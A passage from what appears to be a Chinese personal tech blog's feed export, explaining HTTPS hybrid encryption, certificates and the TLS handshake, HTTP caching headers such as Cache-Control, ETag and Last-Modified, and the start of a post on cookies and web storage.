title="混合加密"></a>混合加密</h4><p>通过<strong>混合加密</strong>的方式可以保证信息的<strong>机密性</strong>，解决了窃听的风险。</p><p>HTTPS采用的是<strong>对称加密</strong>和<strong>非对称加密</strong>结合的「混合加密」方式:</p><ul><li>在<strong>通信建立前</strong>采用<strong>非对称加密</strong>的方式<strong>交换</strong>「会话秘钥」，后续就不再使用非对称加密。</li><li>在<strong>通信过程中</strong>全部使用<strong>对称加密</strong>的「会话秘钥」的方式加密明文数据。</li></ul><p><a href="https://imgtu.com/i/btsj6H"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btsj6H.png" alt="btsj6H.png"></a></p><p>采用「混合加密」的方式的原因:</p><ul><li><strong>对称加密</strong>只使用一个密钥：<strong>运算速度快，密钥必须保密，无法做到安全的密钥交换</strong>。</li><li><strong>非对称加密</strong>使用两个密钥：<strong>公钥和私钥</strong>，<strong>公钥可以任意分发而私钥保密，解决了密钥交换问题但速度慢</strong>。</li></ul><h4 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h4><p><strong>摘要算法</strong>用来实现<strong>完整性</strong>，能够为数据生成独一无二的<strong>指纹</strong>﹐用于校验数据的完整性，解决了篡改的风险。</p><p>客户端在发送明文之前会通过<strong>摘要算法</strong>算出明文的<strong>指纹</strong>，发送的时候把<strong>指纹＋明文</strong>一同加密成密文后，发送给服务器，服务器解密后，用<strong>相同的摘要算法</strong>算出发送过来的明文，通过比较客户端携带的<strong>指纹</strong>和当前算出的<strong>指纹</strong>做比较，若<strong>指纹</strong>相同，说明数据是完整的。</p><p><a href="https://imgtu.com/i/btyCAP"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btyCAP.png" alt="btyCAP.png"></a></p><h4 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h4><p><strong>客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。</strong></p><p>这就存在些问题，<strong>如何保证公钥不被篡改和信任度?</strong></p><p>所以这里就需要借助第三方权威机构<code>CA</code>(数字证书认证机构)﹐将<strong>服务器公钥放在数字证书</strong>（由数字证书认证机构颁发)中，只要证书是可信的，公钥就是可信的。</p><p><a href="https://imgtu.com/i/btyMNV"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btyMNV.png" alt="btyMNV.png"></a></p><p>通过数字证书的方式保证服务器公钥的身份，解决冒充的风险。</p><h3 id="HTTPS连接"><a href="#HTTPS连接" class="headerlink" title="HTTPS连接"></a>HTTPS连接</h3><p>SSL/TLS协议基本流程∶</p><ul><li>客户端向服务器索要并验证服务器的公钥。</li><li>双方协商生产「会话秘钥」。</li><li>双方采用「会话秘钥」进行加密通信。</li></ul><p>前两步也就是SSL/TLS的建立过程，也就是握手阶段。</p><p>SSL/TLS的「握手阶段」涉及四次通信，可见下图:</p><p><a href="https://imgtu.com/i/btydN6"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s4.ax1x.com/2022/03/03/btydN6.png" alt="btydN6.png"></a></p><p>整个SSL/TLS的握手阶段全部结束后，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过用「会话秘钥」加密内容。</p><p>SSL/TLS 1.2需要4次握手，需要2个RTT的时延，上图是把每个交互分开画了，实际上把他们合在一起发送，就是4次握手；</p><p>另外，SSL/TLS 1.3优化了过程，只需要1个RTT往返时延，也就是<strong>只需要3次握手</strong>。</p><h2 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h2><p>通过复用以前获取的资源，可以显著提高网站和应用程序的性能。Web 缓存减少了等待时间和网络流量，因此减少了显示资源表示形式所需的时间。通过使用 HTTP缓存，变得更加响应性。</p><h3 id="不同种类的缓存"><a href="#不同种类的缓存" class="headerlink" title="不同种类的缓存"></a>不同种类的缓存</h3><p>缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当 web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。这样带来的好处有：缓解服务器端压力，提升性能(获取资源的耗时更短了)。对于网站来说，缓存是达到高性能的重要组成部分。缓存需要合理配置，因为并不是所有资源都是永久不变的：重要的是对一个资源的缓存应截止到其下一次发生改变（即不能缓存过期的资源）。</p><p>缓存的种类有很多,其大致可归为两类：<strong>私有与共享缓存</strong>。共享缓存存储的响应能够被多个用户使用。私有缓存只能用于单独用户。本文将主要介绍浏览器与代理缓存，除此之外还有网关缓存、CDN、反向代理缓存和负载均衡器等部署在服务器上的缓存方式，为站点和 web 应用提供更好的稳定性、性能和扩展性。</p><p><a href="https://imgtu.com/i/qZJCuR"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/20/qZJCuR.png" alt="qZJCuR.png"></a></p><h4 id="私有-浏览器缓存"><a href="#私有-浏览器缓存" class="headerlink" title="(私有)浏览器缓存"></a>(私有)浏览器缓存</h4><p>私有缓存只能用于单独用户。你可能已经见过浏览器设置中的“缓存”选项。浏览器缓存拥有用户通过 HTTP下载的所有文档。这些缓存为浏览过的文档提供<strong>向后/向前导航，保存网页，查看源码</strong>等功能，可以<strong>避免再次向服务器发起多余的请求</strong>。它同样可以提供缓存内容的<strong>离线浏览</strong>。</p><h4 id="共享-代理缓存"><a href="#共享-代理缓存" class="headerlink" title="(共享)代理缓存"></a>(共享)代理缓存</h4><p>共享缓存可以被多个用户使用。例如，ISP 或你所在的公司可能会架设一个 web 代理来作为本地网络基础的一部分提供给用户。这样热门的资源就会被重复使用，减少网络拥堵与延迟。</p><h3 id="缓存操作的目标"><a href="#缓存操作的目标" class="headerlink" title="缓存操作的目标"></a>缓存操作的目标</h3><p>虽然 HTTP 缓存不是必须的，但重用缓存的资源通常是必要的。然而常见的HTTP 缓存只能存储 <code>GET</code>响应，对于其他类型的响应则无能为力。缓存的关键主要包括request method和目标URI（<strong>一般只有GET请求才会被缓存</strong>）。 普遍的缓存案例:</p><ul><li>一个检索请求的成功响应: 对于 <code>GET</code>请求，响应状态码为：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200"><code>200</code></a>，则表示为成功。一个包含例如HTML文档，图片，或者文件的响应。</li><li>永久重定向: 响应状态码：<code>301</code>。</li><li>错误响应: 响应状态码：<code>404</code>的一个页面。</li><li>不完全的响应: 响应状态码 <code>206</code>，只返回局部的信息。</li><li>除了 <code>GET</code>请求外，如果匹配到作为一个已被定义的cache键名的响应。</li></ul><p>针对一些特定的请求，也可以通过关键字区分多个存储的不同响应以组成缓存的内容。</p><h3 id="缓存控制"><a href="#缓存控制" class="headerlink" title="缓存控制"></a>缓存控制</h3><h4 id="Cache-control-头"><a href="#Cache-control-头" class="headerlink" title="Cache-control 头"></a><code>Cache-control</code> 头</h4><p><strong>HTTP/1.1</strong>定义的 <code>Cache-Control</code> 头用来区分对缓存机制的支持情况， 请求头和响应头都支持这个属性。通过它提供的不同的值来定义缓存策略。</p><h5 id="没有缓存"><a href="#没有缓存" class="headerlink" title="没有缓存"></a>没有缓存</h5><p>缓存中不得存储任何关于客户端请求和服务端响应的内容。每次由客户端发起的请求都会下载完整的响应内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-store</span><br></pre></td></tr></table></figure><h5 id="缓存但重新验证"><a href="#缓存但重新验证" class="headerlink" title="缓存但重新验证"></a>缓存但重新验证</h5><p>如下头部定义，此方式下，每次有请求发出时，缓存会将此请求发到服务器（译者注：该请求应该会带有与本地缓存相关的验证字段），服务器端会验证请求中所描述的缓存是否过期，若未过期（注：实际就是返回304），则缓存才使用本地缓存副本。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure><h5 id="私有和公共缓存"><a href="#私有和公共缓存" class="headerlink" title="私有和公共缓存"></a>私有和公共缓存</h5><p>“public” 指令表示该响应可以被任何中间人（译者注：比如中间代理、CDN等）缓存。若指定了”public”，则一些通常不被中间人缓存的页面（译者注：因为默认是private）（比如 带有HTTP验证信息（帐号密码）的页面 或 某些特定状态码的页面），将会被其缓存。</p><p>而 “private” 则表示该响应是专用于某单个用户的，中间人不能缓存此响应，该响应只能应用于浏览器私有缓存中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: private</span><br><span class="line">Cache-Control: public</span><br></pre></td></tr></table></figure><h5 id="过期"><a href="#过期" class="headerlink" title="过期"></a>过期</h5><p>过期机制中，最重要的指令是 “<code>max-age=&lt;seconds&gt;</code>“，表示资源能够被缓存（保持新鲜）的最大时间。相对Expires而言，max-age是距离请求发起的时间的秒数。针对应用中那些不会改变的文件，通常可以手动设置一定的时长以保证缓存有效，例如图片、css、js等静态资源。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: max-age=31536000</span><br></pre></td></tr></table></figure><h5 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h5><p>当使用了 “<code>must-revalidate</code>“ 指令，那就意味着缓存在考虑使用一个陈旧的资源时，必须先验证它的状态，已过期的缓存将不被使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: must-revalidate</span><br></pre></td></tr></table></figure><h4 id="Pragma-头"><a href="#Pragma-头" class="headerlink" title="Pragma 头"></a><code>Pragma</code> 头</h4><p><code>Pragma</code>是<strong>HTTP/1.0</strong>标准中定义的一个header属性，请求中包含Pragma的效果跟在头信息中定义Cache-Control: no-cache相同，但是HTTP的响应头没有明确定义这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端。</p><h4 id="新鲜度"><a href="#新鲜度" class="headerlink" title="新鲜度"></a>新鲜度</h4><p>理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做<strong>缓存驱逐</strong>。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端更新缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的<em>。</em>驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个<code>If-None-Match</code>头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 <code>304</code> (Not Modified)（该响应不会有带有实体信息），则表示<strong>此资源副本是新鲜的，这样一来，可以节省一些带宽</strong>。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。</p><p>下面是上述缓存处理过程的一个图示：</p><p><a href="https://imgtu.com/i/qZJiHx"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/20/qZJiHx.png" alt="qZJiHx.png"></a></p><p>对于含有特定头信息的请求，会去计算缓存寿命。比如<code>Cache-control: max-age=N</code>的头，相应的缓存的寿命就是<code>N</code>。通常情况下，对于不含这个属性的请求则会去查看是否包含Expires属性，通过比较Expires的值和头里面Date属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的Last-Modified信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）。</p><p>缓存失效时间计算公式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expirationTime = responseTime + freshnessLifetime - currentAge</span><br></pre></td></tr></table></figure><p>上式中，<code>responseTime</code> 表示浏览器接收到此响应的那个时间点。</p><h3 id="缓存验证"><a href="#缓存验证" class="headerlink" title="缓存验证"></a>缓存验证</h3><p>用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有”Cache-control: must-revalidate”的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced-&gt;Cache为强制验证缓存也能达到相同的效果。</p><p>当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。</p><h4 id="ETags"><a href="#ETags" class="headerlink" title="ETags"></a>ETags</h4><p>作为缓存的一种强校验器，<code>ETag</code>响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 <code>If-None-Match</code>头来验证缓存。</p><p><code>Last-Modified</code> 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 <code>If-Modified-Since</code> 来验证缓存。</p><p>当向服务端发起缓存校验的请求时，服务端会返回 <code>200</code>ok表示返回正常的结果或者 <code>304</code>Not Modified(不返回body)表示浏览器可以使用本地缓存文件。304的响应头也可以同时更新缓存文档的过期时间。</p><h3 id="Vary-响应"><a href="#Vary-响应" class="headerlink" title="Vary 响应"></a>Vary 响应</h3><p><code>Vary</code> HTTP 响应头决定了对于后续的请求头，如何判断是请求一个新的资源还是使用缓存的文件。</p><p>当缓存服务器收到一个请求，只有<strong>当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配</strong>，才能使用缓存的响应。</p><p><a href="https://imgtu.com/i/qZJPD1"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/20/qZJPD1.png" alt="qZJPD1.png"></a></p><p>使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助 Google 或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入Cloaking。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vary: User-Agent</span><br></pre></td></tr></table></figure><p>因为移动版和桌面的客户端的请求头中的User-Agent不同， 缓存服务器不会错误地把移动端的内容输出到桌面端到用户。</p><h3 id="强制缓存和协商缓存的区别"><a href="#强制缓存和协商缓存的区别" class="headerlink" title="强制缓存和协商缓存的区别"></a>强制缓存和协商缓存的区别</h3><blockquote><p>浏览器缓存(Brower Caching)是浏览器对之前请求过的文件进行缓存，以便下一次访问时重复使用，节省带宽，提高访问速度，降低服务器压力。</p></blockquote><p>http缓存机制主要在<strong>http响应头</strong>中设定，响应头中相关字段为<code>Expires</code>、<code>Cache-Control</code>、<code>Last-Modified</code>、<code>Etag</code>。</p><h4 id="浏览器是如何判断是否使用缓存的"><a href="#浏览器是如何判断是否使用缓存的" class="headerlink" title="浏览器是如何判断是否使用缓存的"></a>浏览器是如何判断是否使用缓存的</h4><p>第一次请求：</p><p><a href="https://imgtu.com/i/qZJSgJ"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/20/qZJSgJ.png" alt="qZJSgJ.png"></a></p><p>在第一次请求时，没有缓存，直接向服务器发送请求，服务器会将页面<strong>最后修改时间</strong>通过<code>Last-Modified</code>标识由服务器发送给客户端，客户端记录修改时间；服务器还会生成一个<code>Etag</code>，并发送给客户端。</p><p>第二次请求相同网页：</p><p><a href="https://imgtu.com/i/qZJpv9"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://s1.ax1x.com/2022/03/20/qZJpv9.png" alt="qZJpv9.png"></a></p><p>浏览器缓存主要分为<strong>强缓存</strong>（也称<strong>本地缓存</strong>）和<strong>协商缓存</strong>（也称<strong>弱缓存</strong>）。根据上图，浏览器在第一次请求发生后，再次发送请求时：</p><ul><li><p>浏览器请求某一资源时，会先获取该资源缓存的header信息，然后根据header中的<code>Cache-Control</code>和<code>Expires</code>来判断<strong>是否过期</strong>。若<strong>没过期则直接从缓存中获取资源信息</strong>，包括缓存的header的信息，所以此次请求<strong>不会与服务器进行通信</strong>。这里判断是否过期，则是<strong>强缓存</strong>相关。</p></li><li><p>如果显示已过期，浏览器会向服务器端发送请求，这个请求会携带第一次请求返回的有关缓存的header字段信息</p><ul><li>比如客户端会通过<code>If-None-Match</code>头将先前服务器端发送过来的<code>Etag</code>发送给服务器，服务会对比这个客户端发过来的<code>Etag</code>是否与服务器的相同<ul><li>若<strong>相同</strong>，就将<code>If-None-Match</code>的值设为<code>false</code>，返回状态<code>304</code>，客户端<strong>继续使用本地缓存</strong>，不解析服务器端发回来的数据</li><li>若<strong>不相同</strong>就将<code>If-None-Match</code>的值设为<code>true</code>，返回状态为<code>200</code>，客户端重新解析服务器端返回的数据</li></ul></li></ul><ul><li>如果没有<code>Etag</code>，客户端还会通过<code>If-Modified-Since</code>头将先前服务器端发过来的最后修改时间戳发送给服务器，服务器端通过这个<strong>时间戳</strong>判断客户端的页面是否是最新的，如果不是最新的，则返回最新的内容，如果是最新的，则返回304，客户端继续使用本地缓存。</li></ul></li></ul><h4 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h4><p>强缓存是利用http头中的<code>Expires</code>和<code>Cache-Control</code>两个字段来控制的，用来表示<strong>资源的缓存时间</strong>。</p><p>强缓存中，<strong>普通刷新不会清除它，需要强制刷新。</strong></p><p>浏览器强制刷新，请求会带上<code>Cache-Control:no-cache</code>和<code>Pragma:no-cache</code>。</p><h5 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h5><p><code>Expires</code>是<code>http1.0</code>的规范，它的值是一个绝对时间的GMT格式的时间字符串。如我现在这个网页的<code>Expires</code>值是：<code>expires:Fri, 14 Apr 2017 10:47:02 GMT</code>。这个时间代表这这个资源的失效时间，只要发送请求时间是在<code>Expires</code>之前，那么本地缓存始终有效，则在缓存中读取数据。所以这种方式有一个明显的缺点，由于失效的时间是一个绝对时间，所以当服务器与客户端时间偏差较大时，就会导致缓存混乱。如果同时出现<code>Cache-Control:max-age</code>和<code>Expires</code>，那么<code>max-age</code>优先级更高。如我主页的response headers部分如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cache</span>-control:max-age=<span class="number">691200</span></span><br><span class="line"><span class="attribute">expires</span>:Fri, <span class="number">14</span> Apr <span class="number">2017</span> <span class="number">10</span>:<span class="number">47</span>:<span class="number">02</span> GMT</span><br></pre></td></tr></table></figure><p>那么表示资源可以被缓存的最长时间为691200秒，会优先考虑<code>max-age</code>。</p><h5 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h5><p><code>Cache-Control</code>是在<code>http1.1</code>中出现的，主要是利用该字段的<code>max-age</code>值来进行判断，它是一个相对时间，例如Cache-Control:max-age=3600，代表着资源的有效期是3600秒。cache-control除了该字段外，还有下面几个比较常用的设置值：</p><ul><li><code>no-cache</code>：不使用本地缓存。需要使用缓存协商，先与服务器确认返回的响应是否被更改，如果之前的响应中存在ETag，那么请求的时候会与服务端验证，如果资源未被更改，则可以避免重新下载。</li><li><code>no-store</code>：直接禁止游览器缓存数据，每次用户请求该资源，都会向服务器发送一个请求，每次都会下载完整的资源。</li><li><code>public</code>：可以被所有的用户缓存，包括终端用户和CDN等中间代理服务器。</li><li><code>private</code>：只能被终端用户的浏览器缓存，不允许CDN等中继缓存服务器对其缓存。</li></ul><p>Cache-Control与Expires可以在服务端配置同时启用，同时启用的时候<strong>Cache-Control优先级高</strong>。</p><h4 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h4><p>协商缓存就是<strong>由服务器来确定缓存资源是否可用</strong>，所以客户端与服务器端要通过某种标识来进行通信，从而让服务器判断请求资源是否可以缓存访问。</p><p>这个主要涉及到两组header字段：<code>Etag</code>和<code>If-None-Match</code>、<code>Last-Modified</code>和<code>If-Modified-Since</code>。</p><h5 id="Etag-If-None-Match"><a href="#Etag-If-None-Match" class="headerlink" title="Etag/If-None-Match"></a>Etag/If-None-Match</h5><p>Etag/If-None-Match返回的是一个校验码。ETag可以保证每一个资源是唯一的，资源变化都会导致ETag变化。服务器根据浏览器上送的If-None-Match值来判断是否命中缓存。</p><p>与Last-Modified不一样的是，当服务器返回304 Not Modified的响应时，<strong>由于ETag重新生成过，response header中还会把这个ETag返回，即使这个ETag跟之前的没有变化。</strong></p><h5 id="Last-Modify-If-Modify-Since"><a href="#Last-Modify-If-Modify-Since" class="headerlink" title="Last-Modify/If-Modify-Since"></a>Last-Modify/If-Modify-Since</h5><p>浏览器第一次请求一个资源的时候，服务器返回的header中会加上Last-Modify，Last-modify是一个时间标识该资源的最后修改时间，例如Last-Modify: Thu,31 Dec 2037 23:59:59 GMT。</p><p>当浏览器再次请求该资源时，request的请求头中会包含If-Modify-Since，该值为缓存之前返回的Last-Modify。服务器收到If-Modify-Since后，根据资源的最后修改时间判断是否命中缓存。</p><p>如果命中缓存，则返回304，并且不会返回资源内容，<strong>并且不会返回Last-Modify</strong>。</p><h5 id="为什么要有Etag"><a href="#为什么要有Etag" class="headerlink" title="为什么要有Etag"></a>为什么要有Etag</h5><p>你可能会觉得使用Last-Modified已经足以让浏览器知道本地的缓存副本是否足够新，为什么还需要Etag呢？HTTP1.1中Etag的出现主要是为了解决几个Last-Modified比较难解决的问题：</p><ul><li>一些文件也许会周期性的更改，但是他的**内容并不改变(仅仅改变的修改时间)**，这个时候我们并不希望客户端认为这个文件被修改了，而重新GET；</li><li>某些文件<strong>修改非常频繁</strong>，比如在秒以下的时间内进行修改，(比方说1s内修改了N次)，If-Modified-Since能检查到的粒度是s级的，这种修改无法判断(或者说UNIX记录MTIME只能精确到秒)；</li><li>某些服务器<strong>不能精确的得到文件的最后修改时间</strong>。</li></ul><p>Last-Modified与ETag是可以一起使用的，<strong>服务器会优先验证ETag</strong>。</p><h4 id="不同刷新的请求执行过程"><a href="#不同刷新的请求执行过程" class="headerlink" title="不同刷新的请求执行过程"></a>不同刷新的请求执行过程</h4><ul><li><p><strong>浏览器地址栏中写入URL，回车 / 普通刷新F5</strong>  </p><p>不同浏览器和不同类型资源缓存方式不同，个人理解：</p><ul><li>返回200，并显示从缓存中获取，则为强缓存（虽然没有发出真实的 http 请求）。</li><li>返回304，说明是协商缓存命中走<strong>缓存</strong>。</li></ul></li><li><p><strong>强制刷新Ctrl+F5</strong> 删除缓存，重新请求。</p></li></ul><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>强缓存有缺点，比如说，设置了<code>expires</code>，<code>GMT</code>格式，但是浏览器的时间可以改变，因此就通过<code>cache-control</code>返回一个<strong>相对时间</strong>来。但是假如说<strong>资源并没有更新</strong>，但是强缓存时间过期了，那就需要重新拉去资源，因此就有了<code>Last-Modify</code>，但是last-modified的时间单位是<code>s</code>，当1s内有资源修改，那浏览器返回的最后修改时间和上次的修改时间相同，那就不会重新拉取资源，因此推出了<code>Etag</code>，通过比对资源内容来判断是否修改。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTTP相关内容&quot;&gt;&lt;a href=&quot;#HTTP相关内容&quot; class=&quot;headerlink&quot; title=&quot;HTTP相关内容&quot;&gt;&lt;/a&gt;HTTP相关内容&lt;/h1&gt;&lt;h2 id=&quot;HTTP基本概念&quot;&gt;&lt;a href=&quot;#HTTP基本概念&quot; class=&quot;head</summary>
      
    
    
    
    <category term="浏览器" scheme="https://lesliewaong.top/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
    <category term="HTTP" scheme="https://lesliewaong.top/tags/HTTP/"/>
    
    <category term="GET和POST" scheme="https://lesliewaong.top/tags/GET%E5%92%8CPOST/"/>
    
    <category term="状态码" scheme="https://lesliewaong.top/tags/%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    
    <category term="HTTPS" scheme="https://lesliewaong.top/tags/HTTPS/"/>
    
  </entry>
  
  <entry>
    <title>Cookie、sessionStorage、localStorage 详解及应用场景</title>
    <link href="https://lesliewaong.top/posts/f578340e.html"/>
    <id>https://lesliewaong.top/posts/f578340e.html</id>
    <published>2022-03-01T02:11:13.000Z</published>
    <updated>2022-03-25T14:16:02.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cookie、sessionStorage、localStorage-详解及应用场景"><a href="#Cookie、sessionStorage、localStorage-详解及应用场景" class="headerlink" title="Cookie、sessionStorage、localStorage 详解及应用场景"></a>Cookie、sessionStorage、localStorage 详解及应用场景</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><blockquote><p>HTTP本质是无状态的，使用Cookies可以创建有状态的会话。</p></blockquote><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是<strong>服务器发送到用户浏览器</strong>并<strong>保存在本地的一小块数据</strong>，它会在<strong>浏览器下次向同一服务器再发起请求时被携带并发送到服务器上</strong>。</p><p>通常，它用于告知服务端两个请求是否来自同一浏览器，如<strong>保持用户的登录状态</strong>。Cookie 使基于<strong>无状态</strong>的HTTP协议记录稳定的状态信息成为了可能。</p><p>Cookie 主要用于以下三个方面：</p><ul><li><strong>会话状态管理</strong>（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li><strong>个性化设置</strong>（如用户自定义设置、主题等）</li><li><strong>浏览器行为跟踪</strong>（如跟踪分析用户行为等）</li></ul><p>Cookie <strong>曾一度用于客户端数据的存储</strong>，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，<strong>Cookie 渐渐被淘汰</strong>。由于服务器指定 Cookie 后，<strong>浏览器的每次请求都会携带 Cookie 数据</strong>，<strong>会带来额外的性能开销（尤其是在移动环境下）</strong>。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API">Web storage API</a> （本地存储和会话存储）或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API">IndexedDB</a> 。</p><h3 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h3><p>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 <code>Set-Cookie</code>选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 <code>Cookie</code> 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的<strong>过期时间</strong>、<strong>域</strong>、<strong>路径</strong>、<strong>有效期</strong>、适用站点都可以根据需要来指定。</p><h3 id="Set-Cookie响应头部和Cookie请求头部"><a href="#Set-Cookie响应头部和Cookie请求头部" class="headerlink" title="Set-Cookie响应头部和Cookie请求头部"></a><code>Set-Cookie响应头部</code>和<code>Cookie请求头部</code></h3><p>服务器使用 <code>Set-Cookie</code>响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;</span><br></pre></td></tr></table></figure><p>服务器通过该头部告知客户端保存 Cookie 信息。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>yummy_cookie=choco</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line"><span class="json">[页面内容]</span></span><br></pre></td></tr></table></figure><p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过 <code>Cookie</code>请求头部再发送给服务器。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sample_page.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.org</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure><h3 id="定义-Cookie-的生命周期"><a 